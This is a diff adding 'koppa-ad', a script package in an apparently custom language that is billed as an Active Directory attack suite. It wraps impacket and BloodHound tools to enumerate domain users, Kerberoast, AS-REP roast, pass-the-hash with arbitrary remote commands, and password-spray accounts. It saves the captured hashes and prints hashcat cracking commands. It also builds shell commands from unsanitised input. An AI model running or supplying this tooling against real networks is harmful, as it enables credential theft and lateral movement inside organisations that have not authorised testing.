@@ -1,0 +1,113 @@
+## koppa package: koppa-ad
+## version: 1.0.0
+## description: Active Directory attacks — Kerberoasting, AS-REP, Pass-the-Hash, BloodHound
+## author: KOPPA-OS
+## tags: activedirectory, kerberos, windows, lateral-movement
+
+import net, crypt, log, sys
+
+fn enumerate(domain, dc_ip) {
+    log.info("[*] AD enumeration: " + domain + " @ " + dc_ip)
+    let users = sys.exec("ldapsearch -x -H ldap://" + dc_ip +
+                         " -b 'DC=" + domain.replace(".", ",DC=") +
+                         "' '(objectClass=user)' sAMAccountName 2>/dev/null")
+    for line in users.split("\n") {
+        if line.starts_with("sAMAccountName:") {
+            log.ok("[+] User: " + line.replace("sAMAccountName: ", ""))
+        }
+    }
+}
+
+fn kerberoast(domain, dc_ip, user, password) {
+    log.info("[*] Kerberoasting: " + domain)
+    let cmd = "python3 -m impacket.examples.GetUserSPNs " +
+              domain + "/" + user + ":" + password +
+              " -dc-ip " + dc_ip + " -request 2>/dev/null"
+    let out = sys.exec(cmd)
+    if out.contains("$krb5tgs$") {
+        log.ok("[+] TGS hashes found!\n" + out)
+        sys.write_file("/tmp/kerberoast.txt", out)
+        log.ok("[+] Saved to /tmp/kerberoast.txt")
+        log.muted("    Crack with: hashcat -m 13100 /tmp/kerberoast.txt wordlist.txt")
+    } else {
+        log.err("[-] No SPNs found or error")
+    }
+}
+
+fn asrep_roast(domain, dc_ip, users_file) {
+    log.info("[*] AS-REP Roasting: " + domain)
+    let cmd = "python3 -m impacket.examples.GetNPUsers " +
+              domain + "/ -usersfile " + users_file +
+              " -dc-ip " + dc_ip + " -format hashcat 2>/dev/null"
+    let out = sys.exec(cmd)
+    if out.contains("$krb5asrep$") {
+        log.ok("[+] AS-REP hashes found!\n" + out)
+        sys.write_file("/tmp/asrep.txt", out)
+        log.muted("    Crack with: hashcat -m 18200 /tmp/asrep.txt wordlist.txt")
+    }
+}
+
+fn pass_the_hash(domain, user, ntlm_hash, target, cmd) {
+    log.info("[*] Pass-the-Hash: " + user + " → " + target)
+    let out = sys.exec("python3 -m impacket.examples.wmiexec " +
+                       domain + "/" + user + "@" + target +
+                       " -hashes :" + ntlm_hash +
+                       " '" + cmd + "' 2>/dev/null")
+    log.ok("[+] Output:\n" + out)
+}
+
+fn bloodhound_collect(domain, dc_ip, user, password) {
+    log.info("[*] BloodHound collection: " + domain)
+    let cmd = "bloodhound-python -d " + domain +
+              " -u " + user + " -p " + password +
+              " -ns " + dc_ip + " -c All 2>/dev/null"
+    sys.exec(cmd)
+    log.ok("[+] BloodHound data collected. Import .json files into BloodHound GUI")
+}
+
+fn password_spray(domain, dc_ip, users_file, password) {
+    log.info("[*] Password spray: " + password + " against all users")
+    let users = sys.read_lines(users_file)
+    for user in users {
+        let out = sys.exec("python3 -m impacket.examples.smbclient " +
+                           domain + "/" + user + ":'" + password + "'@" + dc_ip +
+                           " -c 'ls' 2>/dev/null")
+        if out.contains("drw") or out.contains("Directory") {
+            log.ok("[+] Valid creds: " + user + ":" + password)
+        }
+    }
+}
+
+fn main(args) {
+    log.info("[koppa-ad] Active Directory Attack Suite v1.0")
+    let mode     = args[0] or sys.prompt("Mode (enum|kerberoast|asrep|pth|bloodhound|spray): ")
+    let domain   = args[1] or sys.prompt("Domain (e.g. corp.local): ")
+    let dc       = args[2] or sys.prompt("DC IP: ")
+    if mode == "enum"        { enumerate(domain, dc) }
+    if mode == "kerberoast"  {
+        let u = args[3] or sys.prompt("Username: ")
+        let p = args[4] or sys.prompt("Password: ")
+        kerberoast(domain, dc, u, p)
+    }
+    if mode == "asrep" {
+        let uf = args[3] or sys.prompt("Users file: ")
+        asrep_roast(domain, dc, uf)
+    }
+    if mode == "pth" {
+        let u = args[3] or sys.prompt("Username: ")
+        let h = args[4] or sys.prompt("NTLM hash: ")
+        let t = args[5] or sys.prompt("Target IP: ")
+        let c = args[6] or "whoami"
+        pass_the_hash(domain, u, h, t, c)
+    }
+    if mode == "bloodhound" {
+        let u = args[3] or sys.prompt("Username: ")
+        let p = args[4] or sys.prompt("Password: ")
+        bloodhound_collect(domain, dc, u, p)
+    }
+    if mode == "spray" {
+        let uf = args[3] or sys.prompt("Users file: ")
+        let p  = args[4] or sys.prompt("Password to spray: ")
+        password_spray(domain, dc, uf, p)
+    }
+}
